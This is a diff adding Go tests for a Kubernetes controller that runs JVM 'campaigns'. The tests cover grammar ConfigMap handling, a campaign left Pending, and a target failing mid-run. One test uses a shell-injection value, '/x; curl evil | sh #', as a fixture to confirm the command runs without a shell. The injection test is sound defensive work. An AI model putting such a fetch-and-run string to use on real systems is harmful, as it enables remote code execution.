@@ -225,4 +225,88 @@ var _ = Describe("ClosureJVMCampaign Controller (P5a)", func() {
 		c.Spec.Driver.Duration = "10m" // both duration and iterations=500
 		Expect(k8sClient.Create(ctx, c)).NotTo(Succeed())
 	})
+
+	It("does not let classesPath inject shell commands (review #1)", func() {
+		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
+		makeInjectedTarget()
+		c := newCampaign()
+		c.Spec.Driver.ClassesPath = "/x; curl evil | sh #" // shell metacharacters
+		Expect(k8sClient.Create(ctx, c)).To(Succeed())
+		_, err := reconcileOnce()
+		Expect(err).NotTo(HaveOccurred())
+
+		job := &batchv1.Job{}
+		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
+		ic := job.Spec.Template.Spec.InitContainers[0]
+		// cp is exec'd directly — no shell, so the metacharacters are inert cp arguments.
+		Expect(ic.Command[0]).To(Equal("cp"))
+		Expect(ic.Command).NotTo(ContainElement("sh"))
+		Expect(ic.Command).To(ContainElement("/x; curl evil | sh #/."))
+	})
+
+	It("projects the grammar ConfigMap's sole key to a real file when no key is named (review #2)", func() {
+		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
+		makeInjectedTarget()
+		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
+			ObjectMeta: metav1.ObjectMeta{Name: "gram-" + fmt.Sprint(runID), Namespace: namespace},
+			Data:       map[string]string{"jpetstore.grammar": "/x\n"}})).To(Succeed())
+		c := newCampaign()
+		c.Spec.Driver.GrammarConfigMap = "gram-" + fmt.Sprint(runID) // no GrammarKey
+		Expect(k8sClient.Create(ctx, c)).To(Succeed())
+		_, err := reconcileOnce()
+		Expect(err).NotTo(HaveOccurred())
+
+		job := &batchv1.Job{}
+		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
+		var gvol *corev1.Volume
+		for i := range job.Spec.Template.Spec.Volumes {
+			if job.Spec.Template.Spec.Volumes[i].Name == campaignGrammarVol {
+				gvol = &job.Spec.Template.Spec.Volumes[i]
+			}
+		}
+		Expect(gvol).NotTo(BeNil())
+		Expect(gvol.ConfigMap.Items).To(Equal([]corev1.KeyToPath{{Key: "jpetstore.grammar", Path: campaignGrammarKey}}))
+		Expect(envValue(job.Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")).
+			To(ContainSubstring("-Dclosurejvm.grammar=" + campaignGrammarDir + "/" + campaignGrammarKey))
+	})
+
+	It("stays Pending when the grammar ConfigMap is ambiguous (multiple keys, no key named)", func() {
+		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
+		makeInjectedTarget()
+		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
+			ObjectMeta: metav1.ObjectMeta{Name: "gram2-" + fmt.Sprint(runID), Namespace: namespace},
+			Data:       map[string]string{"a": "x", "b": "y"}})).To(Succeed())
+		c := newCampaign()
+		c.Spec.Driver.GrammarConfigMap = "gram2-" + fmt.Sprint(runID)
+		Expect(k8sClient.Create(ctx, c)).To(Succeed())
+		_, err := reconcileOnce()
+		Expect(err).NotTo(HaveOccurred())
+
+		got := &closurejvmv1alpha1.ClosureJVMCampaign{}
+		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
+		Expect(got.Status.Phase).To(Equal(closurejvmv1alpha1.CampaignPending))
+		Expect(meta.FindStatusCondition(got.Status.Conditions, "Ready").Reason).To(Equal("GrammarUnresolved"))
+		Expect(k8sClient.Get(ctx, jobKey, &batchv1.Job{})).NotTo(Succeed()) // no Job
+	})
+
+	It("fails with TargetGone if the target drops out of Injected mid-run (review #3)", func() {
+		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
+		makeInjectedTarget()
+		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
+		_, err := reconcileOnce() // Running
+		Expect(err).NotTo(HaveOccurred())
+
+		// The target reverts to Pending (still exists, no longer Injected) mid-run.
+		t := &closurejvmv1alpha1.ClosureJVMTarget{}
+		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: targetName, Namespace: namespace}, t)).To(Succeed())
+		t.Status.Phase = closurejvmv1alpha1.PhasePending
+		Expect(k8sClient.Status().Update(ctx, t)).To(Succeed())
+		_, err = reconcileOnce()
+		Expect(err).NotTo(HaveOccurred())
+
+		got := &closurejvmv1alpha1.ClosureJVMCampaign{}
+		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
+		Expect(got.Status.Phase).To(Equal(closurejvmv1alpha1.CampaignFailed))
+		Expect(meta.FindStatusCondition(got.Status.Conditions, "Ready").Reason).To(Equal("TargetGone"))
+	})
 })
